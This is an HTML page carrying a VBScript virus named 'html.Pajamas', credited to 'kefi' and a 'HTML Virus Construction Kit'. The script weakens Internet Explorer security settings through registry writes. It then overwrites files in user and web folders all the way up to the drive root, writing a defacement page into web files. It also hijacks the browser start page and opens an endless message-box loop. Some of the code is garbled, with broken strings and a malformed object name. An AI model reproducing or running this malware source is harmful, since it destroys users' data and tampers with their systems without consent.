<HTML><BODY><Script Language=><!--
'html.Pajamas
'by kefi
'created with Kefi's HTML Virus Construction Kit
Dim Shell, Fso
On Error Resume Next
Set Shell = CreateObject("; WScript.Shell")
Set Fso = CreateObject("scripting.filesystemobject")
Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, " REG_DWORD"
Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, " REG_DWORD"
InfectFolder("C:\Windows\Desktop")
InfectFolder("C:\My Documents")
InfectFolder("C:\Inetpub\wwwroot")
InfectFolder("C:\Program Files\SoftIce\EZpad 3.0\templates")
If Day(Now()) = Int(Rnd * 7) + 1 Then
Shell.RegWrite " HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Kefi"
Shell.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page", "Http://www.newbain.com"
Shell.run"Http://www.newbain.com"
Do
MsgBox "You arn't very smart...." , , "^_^"
Loop
End If
Sub InfectFolder(ifp)
Do
Set FolderObj = Fso.GetFolder(ifp)
ifp = Fso.GetParentFolderName(ifp)
Set FO = FolderObj.Files
For Each NewFile In FO
extname = LCase(Fso.GetExtensionName(NewFile.Name))
Set FileDropper = Fso.createtextfile(NewFile.Path)
If extname = "htm "Or extname = "html" Or extname = "asp" Or extname = " htx" Or extname = "hta" Then
FileDropper.writeline "<HTML><HEAD><TITLE>Pajamas</TITLE></HEAD><BODY BGCOLOR="#FFFFFF"TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="1">a message from kefi</font></CENTER></BODY></HTML>
FileDropper.Close
End If
Next
Loop Until FolderObj.IsRootFolder = True
End Sub
--></script></BODY></HTML>
<HTML><HEAD><TITLE>Pajamas</TITLE></HEAD><BODY BGCOLOR="#FFFFFF" TEXT="#000000"><FONT FACE="OCR A Extended"><CENTER><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><font size="5">Don't forget your Pajamas</font><BR><font size="1">a message from kefi</font></CENTER></BODY></HTML>
